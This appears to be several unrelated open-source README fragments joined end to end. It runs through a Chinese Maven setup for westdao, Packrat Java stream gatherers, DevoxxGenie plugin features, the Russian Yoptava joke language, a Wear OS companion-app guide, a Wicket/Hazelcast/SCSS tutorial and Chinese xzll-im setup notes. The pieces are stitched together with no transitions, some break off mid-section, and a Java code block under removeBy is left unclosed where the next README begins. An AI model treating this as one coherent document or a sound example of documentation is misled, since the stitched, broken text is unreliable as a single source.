    <version>${westdao.version}</version>
</dependency>
<plugin>
<groupId>org.apache.maven.plugins</groupId>
<artifactId>maven-compiler-plugin</artifactId>
<version>3.8.1</version>
<configuration>
    <source>1.8</source>
    <target>1.8</target>
   
         <path>
              <groupId>org.projectlombok</groupId>
              <artifactId>lombok</artifactId>
              <version>1.18.24</version>
         </path>
         <path>
            <groupId>cn.k2future</groupId>
            <artifactId>westdao-core</artifactId>
            <version>${westdao.version}</version>
        </path>
    </annotationProcessorPaths>
</configuration>
</plugin>
```

我们还需要先编译一下，编译就是用 mvn compile

这样@Entity的 target 的同级目录下，就会生成以 prefix + entity 名字class 文件，接参是它，保存是它，修改是他，删除也是它，用好它吧

```java
public class WestUser extends User implements WestDao<User>
public class LikeUser extends User implements WestDao<User>
public class MyUser extends User implements WestDao<User>
```

#### distinctBy

`distinctBy(mapper)` - returns elements with distinct values that result from a mapping by the supplied function

```java
  import static io.github.jhspetersson.packrat.Packrat.distinctBy;
  var oneOddOneEven = IntStream.range(1, 10).boxed().gather(distinctBy(i -> i % 2)).toList();
  System.out.println(oneOddOneEven);
```
> [1, 2]

#### filterBy

`filterBy(mapper, value)` - filters mapped elements based on the equality to the value, stream continues with original elements

```java
  import static io.github.jhspetersson.packrat.Packrat.filterBy;
  var oneDigitNumbers = IntStream.range(0, 100).boxed().gather(filterBy(i -> i.toString().length(), 1)).toList();
  System.out.println(oneDigitNumbers);
```
> [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

`filterBy(mapper, value, predicate)` - filters mapped elements based on the predicate test against the value, stream continues with original elements

```java
  import static io.github.jhspetersson.packrat.Packrat.filterBy;
  var ffValue = IntStream.range(0, 1000).boxed().gather(filterBy(Integer::toHexString, ""ff"", String::equalsIgnoreCase)).toList();
  System.out.println(ffValue);
```
> [255]

#### minBy

`minBy(mapper)` - returns the smallest element in the stream, comparing is done after mapping function applied.

```java
  import static io.github.jhspetersson.packrat.Packrat.minBy;
  var check = Stream.of(""2"", ""1"", ""-12"", ""22"", ""10"").gather(minBy(Long::parseLong)).toList();
  System.out.println(check);
```

> [-12]

However, resulting list contains original element of type `String`;

`minBy(mapper, comparator)` - returns the smallest element in the stream, comparing with given comparator is done after mapping function applied.

#### maxBy

`maxBy(mapper)` - returns the greatest element in the stream, comparing is done after mapping function applied.

```java
  import static io.github.jhspetersson.packrat.Packrat.maxBy;
  var check = Stream.of(""2"", ""1"", ""-12"", ""22"", ""10"").gather(maxBy(Long::parseLong)).toList();
  System.out.println(check);
```

> [22]

However, resulting list contains original element of type `String`;

`maxBy(mapper, comparator)` - returns the greatest element in the stream, comparing with given comparator is done after mapping function applied.

#### removeBy

`removeBy(mapper, value)` - removes mapped elements based on the equality to the value, stream continues with original elements

```java
  import static io.github.jhspetersson.packrat.Packrat.removeBy;
  var oneDigitNumbers = IntStream.range(0, 100).boxed().gather(removeBy(i -> i.toString().length(), 2)).toList();
  System.out.println(oneDigitNumbers);

### Smart Model Selection and Cost Estimation
The language model dropdown is not just a list anymore, it's your compass for smart model selection.

![Models](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/1924a967-37c3-400c-bac4-fc1a678aeec5)

See available context window sizes for each cloud model
View associated costs upfront
Make data-driven decisions on which model to use for your project

### Add Project to prompt & clipboard

You can now add the full project to your prompt IF your selected cloud LLM has a big enough window context.

![AddFull](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/be014cf1-ee01-428a-bd75-55acc82627fb)

### Calc Cost

Leverage the prompt cost calculator for precise budget management. Get real-time updates on how much of the context window you're using.

![AddCalcProject](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/0c971331-40fe-47a4-8ede-f349fa40c00c)

See the input/output costs and window context per Cloud LLM.  Eventually we'll also allow you to edit these values.

### Handling Massive Projects?
""But wait,"" you might say, ""my project is HUGE!"" 😅 

Fear not! We've got options:

1. Leverage Gemini's Massive Context: 

Gemini's colossal 1 million token window isn't just big, it's massive. We're talking about the capacity to digest approximately 30,000 lines of code in a single go. That's enough to digest most codebases whole, from the tiniest scripts to some decent projects.

But if that's not enough you have more options...

2. Smart Filtering: 

The new ""Copy Project"" panel lets you: 

Exclude specific directories 
Filter by file extensions
Remove JavaDocs to slim down your context

![Filter](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/9dd782db-5f2a-4397-90d9-21cfefac753c)

3. Selective Inclusion 

Right-click to add only the most relevant parts of your project to the context.

![RightClick](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/a86c311a-4589-41f9-bb4a-c8c4f0b884ee)


## The Power of Full Context: A Real-World Example
The DevoxxGenie project itself, at about 70K tokens, fits comfortably within most high-end LLM context windows. 
This allows for incredibly nuanced interactions – we're talking advanced queries and feature requests that leave tools like GitHub Copilot scratching their virtual heads!

## Local LLM Cluster with Exo

V0.2.7 also supports Exo, a local LLM cluster for Apple Silicon which allows you to run Llama 3.1 8b, 70b and 405b on your own Apple computers 🤩

## О языке
Yoptava — это первый в мире язык программирования на русском языке, транслируемый в Java с помощью Runtime компилятора. Yoptava позволяет выбрать определённую лексику для программирования, например:

- [ruptava](https://github.com/Lime-blur/yoptava/blob/main/example/ruptava) — классический язык программирования Java на русском языке
- [belptava](https://github.com/Lime-blur/yoptava/blob/main/example/belptava) — классический язык программирования Java на белорусском языке
- [goptava](https://github.com/Lime-blur/yoptava/blob/main/example/goptava) — язык программирования Java для гопников и реальных пацанов, основанный на [YoptaScript](http://yopta.space/)
- [leptava](https://github.com/Lime-blur/yoptava/blob/main/example/leptava) — язык программирования Java использующий старославянскую лексику

## Разработка

Вся разработка и поиск ошибок ведётся в ветке [**develop**](https://github.com/Lime-blur/yoptava/tree/develop)!
При разработке языка использовался язык программирования [YoptaScript](http://yopta.space/), [Словарь старославянских слов](https://hogwarts.ru/library/show.php?cat=1&id=39503&uid=guest), [Словарь старорусских слов](https://proza.ru/2022/11/18/1773), а также [Викисловарь](https://www.wiktionary.org/).

## Предупреждения

> [!CAUTION]
> Yoptava была реализована всего за несколько дней и не является серьёзной разработкой.<br>
> Yoptava не несёт в себе цели оскорбить кого-то или унизить. Yoptava содержит **множество нецензурной лексики**.

## Использование

1. Добавьте репозиторий JitPack в файл сборки:
```XML
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```

2. Добавьте зависимость:
```XML
<dependency>
    <groupId>com.github.Lime-blur</groupId>
    <artifactId>yoptava</artifactId>
    <version>latest_version</version>
</dependency>
```

3. Инициализируйте необходимый язык программирования, например `Goptava`:
```Java
public class Main {
    public static void main(String[] args) {
        Yoptava.initGoptava();
    }
}
```

4. Приступайте к написанию русскоязычного Java кода в файле `Авторитет.goptava`, предварительно положив его в папку `goptava` в корне вашего проекта! Примеры реализации:
    - Goptava: [goptava](https://github.com/Lime-blur/yoptava/blob/main/example/goptava), [example_goptava](https://github.com/Lime-blur/yoptava/blob/main/example/src/main/java/ru/limedev/example/example_goptava)
    - Leptava: [leptava](https://github.com/Lime-blur/yoptava/blob/main/example/leptava), [example_leptava](https://github.com/Lime-blur/yoptava/blob/main/example/src/main/java/ru/limedev/example/example_leptava)
    - Ruptava: [ruptava](https://github.com/Lime-blur/yoptava/blob/main/example/ruptava), [example_ruptava](https://github.com/Lime-blur/yoptava/blob/main/example/src/main/java/ru/limedev/example/example_ruptava)
    - Belptava: [belptava](https://github.com/Lime-blur/yoptava/blob/main/example/belptava), [example_belptava](https://github.com/Lime-blur/yoptava/blob/main/example/src/main/java/ru/limedev/example/example_belptava)

## Добавление собственного словаря

Yoptava поддерживает возможность добавления собственного словаря. Для этого необходимо:

1. Реализовать класс словаря:
```Java
public final class MyptavaDictionary implements Dictionary {

    private final Map<String, String> keywords = new HashMap<String, String>() {
        {
            put(""ключевое слово в вашем языке"", ""оригинал ключевого слова Java"");
        }
    };

    @Override
    public @NotNull Map<String, String> getKeywords() {
        return keywords;
    }
}
```

2. Создать собственные настройки:
```Java
public final class Settings {
    static final String PROJECT_PATH = System.getProperty(""user.dir"") + FileUtils.fileSeparator;
    static final Language LANGUAGE_MYPTAVA = new Language("".myptava"", new MyptavaDictionary());
    static final String SOURCES_DIRECTORY_MYPTAVA = ""myptava"";
    static final String PROJECT_SOURCES_DIRECTORY_MYPTAVA = PROJECT_PATH + SOURCES_DIRECTORY_MYPTAVA + FileUtils.fileSeparator;
    static final String MAIN_CLASS_NAME_MYPTAVA = ""Load"";
    static final String MAIN_CLASS_LOAD_METHOD_MYPTAVA = ""load"";
}
```

3. Реализовать класс настроек:
```Java
public final class MyptavaSettings implements YoptavaSettings {

    @Override
    public Language getLanguage() {
        return Settings.LANGUAGE_MYPTAVA;
    }

    @Override
    public String getSourcesDirectory() {
        return Settings.SOURCES_DIRECTORY_MYPTAVA;
    }

    @Override
    public String getProjectSourcesDirectory() {
        return Settings.PROJECT_SOURCES_DIRECTORY_MYPTAVA;
    }

    @Override
    public String getMainClassName() {
        return Settings.MAIN_CLASS_NAME_MYPTAVA;
    }

    @Override
    public String getMainClassLoadMethod() {
        return Settings.MAIN_CLASS_LOAD_METHOD_MYPTAVA;
    }
}
```

4. Инициализировать собственный язык программирования:
```Java
public class Main {

    private static final MyptavaSettings myptavaSettings = new MyptavaSettings();

    public static void main(String[] args) {
        Yoptava.init(myptavaSettings);
    }
}
```

5. После этого можно приступать к написанию кода на вашем языке программирования в файле `Load.myptava`, предварительно положив его в папку `myptava` в корне вашего проекта! Пример реализации: [myptava](https://github.com/Lime-blur/yoptava/blob/main/example/myptava), [example_custom](https://github.com/Lime-blur/yoptava/blob/main/example/src/main/java/ru/limedev/example/example_custom).

## Проблемы

- **Приветствуется** упрощение парсинга файлов в классе [YoptavaParser](https://github.com/Lime-blur/yoptava/blob/main/src/main/java/ru/limedev/yoptava/parser/YoptavaParser.java)
- **Очень приветствуется** дополнение словарей `goptava`, `ruptava`, `belptava` и `leptava`

## Добавление подсветки синтаксиса
Если вы пользуетесь Intellij Idea, вы можете добавить подсветку синтаксиса `.goptava`, `.ruptava`, `belptava`, `.leptava` файлов используя следующие файлы: [Goptava.txt](https://github.com/Lime-blur/yoptava/blob/main/intellij_settings/editor_filetypes/Goptava.txt), [Ruptava.txt](https://github.com/Lime-blur/yoptava/blob/main/intellij_settings/editor_filetypes/Ruptava.txt), [Belptava.txt](https://github.com/Lime-blur/yoptava/blob/main/intellij_settings/editor_filetypes/Belptava.txt), [Leptava.txt](https://github.com/Lime-blur/yoptava/blob/main/intellij_settings/editor_filetypes/Leptava.txt).

## Примеры
В [ruptava](https://github.com/Lime-blur/yoptava/blob/main/example/ruptava), [belptava](https://github.com/Lime-blur/yoptava/blob/main/example/belptava), [goptava](https://github.com/Lime-blur/yoptava/blob/main/example/goptava) и [leptava](https://github.com/Lime-blur/yoptava/blob/main/example/leptava) присутствуют примеры использования массивов, мап, циклов, switch-оператора, а также реализации пакетов, классов и методов.

![image](https://github.com/bredlix/wf_companion_app/assets/91148776/c0fe5aa3-950f-4fcf-ab6b-a9218d8a0a19)

The main purpose of this app is to open your watch face’s Google Play Store page directly on the connected Wear OS smartwatch with a simple click.

Additional features:
- Opens your google developer's page to showcase other apps
- Directs users to review section of the watch face to rate it

Bonus: support of light/dark themes

### **You can freely use it to build and distribute your own companion apps.**

NOTE:
- companion app's package should be the same as the watch face package
- all the steps bellow suppose the use of `Project` project view
- most of the changes are supposed to be done in the `scr > main` folder (app module)
- the build can be tested on the device either before step.2 or after step.4. simply `File > Sync Project with Gradle Files`
- everything is done in Android Studio v2023.2.1.25

## 

### 1a. Clone the project directly in Android Studio

Open Android Studio and select `Get from Version Control`. Enter the URL of this GitHub repository and click `Clone`. The project will be downloaded and opened automatically in Android Studio.

### OR

### 1b. Download zip and open with Android Studio locally

On the repository page click `Code > Download ZIP`. Extract content to the preferred folder. Open Android Studio and select `Open an existing Android Studio project`. Navigate to the directory where you extracted the project and open it.

### 2. Update the Gradle build file

Open the `build.gradle.kts` file in the `app` directory.
- Find the `android` block and change the `namespace` to your new package name.
- Find the `defaultConfig` block and change the `applicationId` to your new package name.

### 3. Change the Package Name
![image](https://github.com/bredlix/wf_companion_app/assets/91148776/f5a43c6e-dde7-4855-8e6f-fff31d33c8e9)![Снимок экрана 2024-04-27 234356](https://github.com/bredlix/wf_companion_app/assets/91148776/a559450c-331a-4e5d-8d5f-f0326fe81985)


In the Project pane, go to the `Options (3 dots) > Tree appearance > Compact Middle Packages` and uncheck/de-select it. Your package directory will now be broken up into individual directories (`com > android > wf_companion_app >...`).
Individually select each directory(`android`, `wf_companion_app`) and:

- Right-click it
- Select `Refactor`
- Click on `Rename`
- In the Pop-up dialog, click on `All Directories`
- Enter the new name and hit `Refactor`
- Allow a minute to let Android Studio update all changes.

Eventually you should have `com.your_comany.your_app_name` and the corresponding folder structure `main > java > com > your_comany > your_app_name`.

### 4. Update AndroidManifest.xml

Open the `AndroidManifest.xml` file. Find the `<activity>` tag and change the `android:name` attribute to `com.your_comany.your_app_name.MainActivity`.

### 5. Change app icon

Right-click the res folder and go to `New > Image Asset`. On the `Foreground Layer` tab, select the `Asset Type` to `Image` and browse to the new icon you want.
On the `Background Layer` tab, select the `Asset Type` to `Color` and pick a color of your choice. Click `Next > Finish` and the icon should be changed.

### 6. Change watchface image

Go to `res > drawable` to find the `wf_img.png`. You can replace an existing image by right-clicking it and selecting `Reveal in Finder` (or `Show in Explorer` for Windows), then replace the file there with your new image (it should have the same name and format).
If you want to add a new image, simply copy and paste your image file into the `res/drawable` directory. You can then use this image in your project by referencing it as `@drawable/your_image_name`.

### 7. Change app display name

Go to `res > values` to find `strings.xml`. Change `name=""app_name""` entry to your desired app name.

### 8. Change google play developer ID

Go to `res > values` to find `strings.xml`. Change `name=""dev_id""` entry to your google play developer ID (to open your dev page when user clicks 'more apps' button).

### 9. Change Privacy policy URL

Go to `res > values` to find `strings.xml`. Change `name=""policy_url""` entry to your Privacy Policy URL.

### 10. Sync the project with gradle

After you've made these changes, be sure to sync your project with Gradle files. You can do this by clicking on `File > Sync Project with Gradle Files`.

### 11. Test the build

Run your project on the connected or emulated device to see the changes take effect.

### 12. Build apk/aab for upload

bitstorm/modern-webdev-wicket,main,"# Modern Web development with Apache Wicket, Spring Boot, Hazelcast and WebJars


When it comes to implement web applications, Java developers usually feel lost with modern web technologies and they might think that nowadays it's not possible to implement robust and maintainable web applications without adopting the standard JavaScript-based development stack. But what if I tell you that Java is a first-class platform also for web development and that you don't need to switch to a different technology?

The following is a list of _howto_ and example projects that show you how to use Apache Wicket and other familiar frameworks and tools from the Java ecosystem (like Hazelcast, Spring Boot, WebJars, Apache Maven, etc...) to build modern and scalable applications without leaving the Java platform.

More in details you will see how to reach the following goals:

- [Producing clean and resurce-friendly URLs](#produce-resource-friendly-urls)
- [Managing CSS and JavaScript resources with WebJars and Maven](#manage-css-and-javascript-libraries-with-webjars-and-maven)
- [Scaling your application with session clustering and caching](#use-spring-boot-and-hazelcast-to-scale-your-application-with-session-clustering-and-caching)
- [Styling your application using SCSS](#style-your-application-with-scss)

> [!NOTE]
> The following examples are based on Wicket 10 and Java 21, although they should work also for Wicket 9 and Java 17

## Produce resource-friendly URLs

#### Page mounting

Wicket already comes with a native solution to generate structured and resource-friendly URLs by mounting pages to a specific path:

```java
mountPage(""/path/to/page"", MountedPage.class);
```

The path used for mounted pages can contain also segments with dynamic values and they are declared using a special syntax:

```java
/*
 In the following example the path used to mount UserPage has a required parameter
 (userId) and an optional one (taxId).

 For example the following path are both valid:
  - ""/user/123/details/ABC1234567""
  - ""/user/123/details""
*/

mountPage(""/user/${userId}/details/#{taxId}"", UserPage.class);
```

For a full description of page mounting see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_generating_structured_and_clear_urls)


#### Remove page id from URL

By default Wicket uses a _versioning_ system for stateful pages assiging a incremental id to each version of the pages. This id is usually appended as query parameter at the end of the page's URL:

```
www.myhost.net/page-path?1234
```

The purpose of page versioning is to support browser’s back button: when this button is pressed Wicket must respond by rendering the same page instance previously used.
Again, for a full description of this mechanism see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_page_versioning_and_caching)

Usually having this id at the end of the page URL is not a big deal, but sometimes you might prefer simply hiding it in the final URL.  

```java
public class NoPageIdMapper extends MountedMapper {

    public NoPageIdMapper(String mountPath, Class<? extends IRequestablePage> pageClass) {
        super(mountPath, pageClass);
    }

    @Override
    protected void encodePageComponentInfo(Url url, PageComponentInfo info) {
        //if componentInfo is null we have a page url and we skip page parameters, otherwise we keep them
        if (info.getComponentInfo() != null) {
            super.encodePageComponentInfo(url, info);
        }

    }
}
```
Please note that this mapper will remove version id only for page URLs, so stateful behaviors (like AJAX behaviors) will continue to work as usual.  

Once we created our custom mapper we must use it to mount our pages: 

```java
public void init()
{
	super.init();

	NoPageIdMapper mapper = new NoPageIdMapper(path, pageClass);
	mount(mapper);
}
```

> [!WARNING]
> Keep in mind that by removing the page id from URL you will lost the browser’s back button support.

## Manage CSS and JavaScript libraries with WebJars and Maven

WebJars is a project aimed to provide client-side libraries distributions as Maven dependency. In this way these libraries can be read directly from JAR files as regular dependecies. WebJars comes with numerous Java libraries to easily integrate this framework with the most popular web frameworks, Wicket included.

For example (project _wicket-webjars_) let's say we want to use Bootstrap 5.3.3 in our Wicket application. The first step is to include the following dependecies in our pom.xml:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars.npm</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

The first dependency is the library that allows to use WebJars with Wicket while the second is the Bootstrap library distributed by WebJars project.
The second configuration step is the initialization of _wicket-webjars_ library with the following simple code line in our application _init()_ method:

```java
public void init()
{
	super.init();

	// init wicket-webjars library
	WicketWebjars.install(this);
}
```

Now we can add Bootstrap to our page as Wicket CssHeaderItem using reference class _WebjarsCssResourceReference_

```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/5.3.3/css/bootstrap.min.css"")));

}
```

The path used with _WebjarsCssResourceReference_ is appendend to _META-INF/resources/webjars/_ to obtain the path to the desired file inside the library jar. See the [official WebJars site](https://www.webjars.org) to have a look at the content of jar libraries.

To automatically use the version of a WebJar library from your pom.xml, we can simply replace the version in path with the _current_ string. When a resource name is resolved this string will be replaced with the most recent available version in classpath: 


```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/current/css/bootstrap.min.css"")));

}
```

It is also possible to use a resource directly from html markup prepending _/webjars/_ to the resource path:

```html
<link rel='stylesheet' href='/webjars/bootstrap/5.3.3/css/bootstrap.min.css'>
```

> [!WARNING]
> If you are using Jetty remember that resource can be used from html only from version 12.

The project can be started with command `mvn jetty:run`. The page can be seen opening your browser at [http://localhost:8080](http://localhost:8080)

## Use Spring Boot and Hazelcast to scale your application with session clustering and caching

Scaling a web application is not a trivial task and it usually involves a lot of work on additional architectural aspects such as caching, services orchestration and replication, etc... Java developers can count on different valuable frameworks that can dramatically help handling those aspects providing a distributed data storage that can be used both as caching service and coordinator between two or more JVM. One of these framework is [Hazelcast](https://hazelcast.com/) which can be used also for web session clustering. 

In this example (project _wicket-hazelcast_) we will see how to use integrate Wicket with Spring Boot and Hazelcast to share and replicate web session among two or more server instances making our application fault tolerant and scalable.

Our application is a Spring Boot-based web application using Apache Wicket. Let's see the required dependecies to our pom.xml:


```xml
<!-- SESSION REPLICATION -->
<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-core</artifactId>
    <version>3.2.2</version>
</dependency>

<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-hazelcast</artifactId>
    <version>3.2.2</version>          
</dependency>

<!-- WICKET SPRING BOOT INTEGRATION -->
<dependency>
  <groupId>com.giffing.wicket.spring.boot.starter</groupId>
  <artifactId>wicket-spring-boot-starter</artifactId>
  <version>4.0.0</version>        
</dependency>

<!-- WICKET HAZELCAST INTEGRATION -->
<dependency>
    <groupId>org.wicketstuff</groupId>
    <artifactId>wicketstuff-datastore-hazelcast</artifactId>
    <version>10.0.0</version>
</dependency>

<!-- SPRING HAZELCAST INTEGRATION (for caching) -->
<dependency>
    <groupId>com.hazelcast</groupId>
    <artifactId>hazelcast-spring</artifactId>
    <version>5.3.6</version>
</dependency>
```

The main dependency is probably the one on [Wicket and Spring Boot integration project](https://github.com/MarcGiffing/wicket-spring-boot) (artifactId _wicket-spring-boot-starter_) which lays the foundation for our application.
The other dependencies are for Hazelcast integration with Spring and Wicket and for web session clustering.

Now let's look at the code starting with the configuration required to create an _HazelcastConfig_ instance for our application. This is basically the code used in the official [Hazelcast tutorial](https://docs.hazelcast.com/tutorials/spring-session-hazelcast)


```java
@Configuration
@EnableHazelcastHttpSession
@EnableCaching
public class HazelcastConfig {

    @SpringSessionHazelcastInstance
    @Bean(destroyMethod = ""shutdown"")
    public HazelcastInstance hazelcastInstance() {
        Config config = new Config();

        JoinConfig join = config.getNetworkConfig().getJoin();
        // enabling multicast for autodiscovery.
        join.getMulticastConfig().setEnabled(true);

        AttributeConfig attributeConfig = new AttributeConfig()
                .setName(HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE)
                .setExtractorClassName(PrincipalNameExtractor.class.getName());

        config.getMapConfig(HazelcastIndexedSessionRepository.DEFAULT_SESSION_MAP_NAME)
            .addAttributeConfig(attributeConfig).addIndexConfig(
                new IndexConfig(IndexType.HASH, HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE));
        
        // use custom serializer for better performances. This is optional.
        SerializerConfig serializerConfig = new SerializerConfig();
        serializerConfig.setImplementation(new HazelcastSessionSerializer()).setTypeClass(MapSession.class);
        config.getSerializationConfig().addSerializerConfig(serializerConfig);

        return Hazelcast.newHazelcastInstance(config);
    }

    @Bean
    public CacheManager cacheManager(HazelcastInstance hazelcastInstance) {
        return new HazelcastCacheManager(hazelcastInstance);
    }

}
```

In the class above we used two annotation (beside _@Configuration_), one to enable session clustering with Hazelcast (_@EnableHazelcastHttpSession_) and another to enable Spring caching support (_@EnableCaching_) backed by Hazelcast. Spring caching requires to create a bean of type _CacheManager_

> [!NOTE]
> Spring caching is enabled only for illustration purpose as it's not used in the example code. However with a _CacheManager_ bean created, you can use Spring annotations to [cache the results of you services](https://www.baeldung.com/spring-cache-tutorial).

> [!WARNING]
> Please note that for sake of simplicity we enabled multicast for autodiscovery, so Hazelcast will automatically add to the cluster any new application instance visible on our local network. Keep in mind that multicast is usually not suited for production environment where a safer join configuration is usually required. See the [Hazelcast documentation](https://docs.hazelcast.com/hazelcast/5.4/clusters/network-configuration) for more information on network configuration.


As final configuration step we must tell Wicket to store statefull page instances using Hazelcast. This is done inside Application _init()_ method registering a custom _PageManagerProvider_ using class _HazelcastDataStore_ from WicketStuff project. We also use class _SessionQuotaManagingDataStore_ to limit page storing to max 4 instances per session:

```java
@Override
public void init()
{
	super.init();

	// add your configuration here
	HazelcastInstance instance = getApplicationContext().getBean(HazelcastInstance.class);

	setPageManagerProvider(new DefaultPageManagerProvider(this) {
	    @Override
	    protected IPageStore newPersistentStore() {
		HazelcastDataStore hazelcastDataStore = new HazelcastDataStore(getName(), instance);
	
		return new SessionQuotaManagingDataStore(hazelcastDataStore, 4);
	    }
	});
}
```

With all configuration code in place we can start our application with the following command (assuming port 8083 is free on our machine).

```
SERVER_PORT=8083 mvn spring-boot:run
```

Taking a look at our application logs we can see a message from Hazelcast confirming that a new cluster has been created and the application has successfully joined it:

```
2024-06-13 11:39:30.169 [main] INFO  com.hazelcast.core.LifecycleService - [10.3.0.8]:5702 [dev] [5.3.6] [10.3.0.8]:5702 is STARTING
2024-06-13 11:39:32.835 [main] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5702 [dev] [5.3.6] 

Members {size:1, ver:1} [
	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6 this
]
```

Once the application is up we can open our browser at [http://localhost:8083](http://localhost:8083) and check the given sessionId value. Now let's start a second instance of our application. We expect it tojoin the existing cluster and using the same shared web session. The application can be started with the same command seen above but using a different available port:

```
SERVER_PORT=8084 mvn spring-boot:run
```

Again, looking at the logs of both this new instance or the existing one we should see that the new one has joined the cluster:

```
2024-06-13 11:51:35.757 [hz.gallant_kapitsa.IO.thread-in-0] INFO  c.h.i.server.tcp.TcpServerConnection - [10.3.0.8]:5703 [dev] [5.3.6] Initialized new cluster connection between /10.3.0.8:43349 and /10.3.0.8:5702
2024-06-13 11:51:41.000 [hz.gallant_kapitsa.priority-generic-operation.thread-0] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5703 [dev] [5.3.6] 

Members {size:2, ver:2} [
	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6
	Member [10.3.0.8]:5703 - bf396942-563d-4750-a0ba-0bac3e241fc8 this
]
```

Opening our browser at [http://localhost:8084](http://localhost:8084) we should have the confirm that the new instance is using the same session with the same id.
Feel free to play around stopping/restarting one of the two instances at a time to see that the session isn't lost as long as one instance is still active. 

## Style your application with SCSS

When it comes to web application styling, SCSS is a precious ally as it allows to use a more advanced syntax to manage and organize our css resources. Since SCSS needs to be converted in standard CSS language, we need a compiler to perform this task.

For developers it would be even better if this compiler could operate ""live"", automatically compiling SCSS sources as they are modified. Most of the time this time of compiler requires to use a dedicated external application or some kind of IDE extention to monitor our SCSS files and recompile them as they get modified. \
With Wicket we can use library _wicket-bootstrap-sass_ that offers an even more flexible solution in the form of [CSS resource](https://nightlies.apache.org/wicket/guide/10.x/single.html#_resource_management_with_wicket) that points to a SCSS file and compiles it on the fly, without depending on an external application.

> [!NOTE]
> Library _wicket-bootstrap-sass_ depends on OS library [libsass](https://github.com/sass/libsass), so be sure to have it already installed before running the following example code.

Example project _wicket-scss_ uses both library _wicket-bootstrap-sass_ and _WebJars_ to show how to easily customize Bootstrap 5 style using a SCSS file that extends the default _bootstrap.scss_ file distributed with WebJars dependency.

The project has the same dependencies seen for project _wicket-webjar_ in addition to module _wicket-bootstrap-sass_:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>de.agilecoders.wicket</groupId>
    <artifactId>wicket-bootstrap-sass</artifactId>
    <version>7.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

In our application's _init()_ method we initialize both WebJars and SASS integration: 

```java
@Override
public void init()
{
    super.init();

   
    // init wicket WebJars and SASS library
    WicketWebjars.install(this);
    BootstrapSass.install(this);
}
```

Next, let's have a look at the file _custom-css.scss_ we will use to customize our Boostrap 5 based theme:

```scss
//SCSS VARIABLE OVERRIDING
$primary: #397EB4;
$warning: #f19027;
$min-contrast-ratio: 3;


//INCLUDING MAIN BOOTSTRAP SCSSS
@import ""webjars!bootstrap/current/scss/bootstrap.scss"";
```

The file has a starting section where we override some of the Bootstrap variables (see [official documentation](https://getbootstrap.com/docs/5.0/customize/sass/#modify-map)) to customize colors for primary and warning buttons. \
The last line imports the main Bootstrap 5.3.3 SCSS which is loaded from the corresponding WebJar using the syntax _webjars!<path_to_file>_

Finally, our file _custom-css.scss_ can be used as regular Wicket CSS header item using class _SassResourceReference_ that takes care of compilation behind the scenes:

```java
protected final CssReferenceHeaderItem customCss = 
    CssHeaderItem.forReference(new SassResourceReference(HomePage.class, ""custom-css.scss""));

@Override
public void renderHead(IHeaderResponse response) {
    response.render(customCss);
}
```

Once the application is started (with the usual command `mvn jetty:run`.) you can play around modifying file _custom-css.scss_ and see changes in real time.

# 3、如何参与开发本项目？

详见文档：[CONTRIBUTING](CONTRIBUTING.md)

# 4、如何启动并运行此项目？

## 4.1、在idea中运行此项目
注意：因为此项目目前还在开发中，多数情况下，都是在idea（xzll-im-server）和 Android Studio（xzll-im-client） 中写完代码并调试自测。所以着重看这个就行。

### 4.1.1、xzll-im-server 依赖环境准备

首先需要安装依赖的环境，想运行服务端，以下几个是中间件和db是必不可少的
- RocketMQ：（docker部署）
  - 包含（rocket_nameserver,rocket_broker,rocket_console）
- Redis （docker部署）
- Zookeeper（docker部署）
- Nacos（docker部署）
- MySQL（虚拟机部署）详见：[Centos7安装mysql8.0.35（亲测）](https://juejin.cn/post/7299389919953272883)
- ElasticSearch（虚拟机部署）详见：[Centos7安装Elasticsearch和Kibana 记录（无坑版）](https://juejin.cn/post/7295672695001120795)

为了方便，其中docker部署的，写了个脚本（脚本内容 [戳这里（注意运行脚本时需要指定你的ip）](script/start_dependencies/dev_start_dependencies_script.sh)），启动脚本的命令是：
```
sudo sh dev_start_dependencies_script.sh 172.30.128.65
```
启动后的效果如下:
![](doc/环境准备/images/img.png)


### 4.1.2、导入 xzll-im-server 所依赖的 nacos 配置文件
在启动之后，接下来，需要配置nacos相关，首先我们先建一个命名空间，此命名空间用于区分环境，如下：
![](doc/环境准备/images/创建nacos命名空间.png)

接下来 导入nacos配置（nacos 配置文件[戳这里](doc/环境准备/nacos_config)）：
![](doc/环境准备/images/导入nacos配置.png)

导入后的结果：
![](doc/环境准备/images/导入后结果.png)

## 4.2、演示

编写中.....




## 4.3、在虚拟机中运行此项目
参考我在掘金的文章：[使用Jenkins 部署我的 xzll-im-server 项目](https://juejin.cn/post/7392104848973709352)

